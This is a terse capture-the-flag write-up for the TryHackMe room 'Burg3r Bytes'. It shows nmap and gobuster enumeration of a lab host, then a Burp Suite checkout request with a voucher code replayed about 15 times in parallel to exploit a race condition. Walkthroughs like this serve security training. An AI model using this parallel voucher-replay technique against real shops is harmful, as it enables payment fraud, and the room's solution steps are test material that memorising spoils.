<code>
  
**TryHack3M: Burg3r Bytes**

https://tryhackme.com/room/burg3rbytes

**Enumeration**

``` root@ip-10-67-96-166:~# nmap -Pn -p- 10.67.167.186
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-29 12:10 GMT
Nmap scan report for 10.67.167.186
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
root@ip-10-67-96-166:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.67.167.186 -x php,txt,html
```
[+] Url:                     http://10.67.167.186
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 7724]
/register             (Status: 200) [Size: 7773]
/basket               (Status: 200) [Size: 6081]
/checkout             (Status: 200) [Size: 3095]
/console              (Status: 200) [Size: 1563]
Progress: 873100 / 873104 (100.00%)
======================================
```


**Exploiting**

run in repeter in paralel run 15x 

in Burpsuit

```POST /checkout HTTP/1.1
Host: 10.67.128.59
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.67.128.59/checkout
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://10.67.128.59
Connection: keep-alive
Cookie: session=eyJjc3JmX3Rva2VuIjoiMTc0ZjYyNDc3ZDJmNzVlMTJjMTIxZThlMmM2OTg1OTk3NzdiYzI3MyJ9.aVN05w.Ppwl7uwxT0EOcvv8PV0FiCJWEm0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrf_token=IjE3NGY2MjQ3N2QyZjc1ZTEyYzEyMWU4ZTJjNjk4NTk5Nzc3YmMyNzMi.aVN03A.fycCrxgNSYPyzNXV2OvX-Pht7PE&name=&voucher_code=TRYHACK3M&submit=Checkout

end get this
http://10.67.128.59/receipt/82739098304716027352341076?name=

</code>
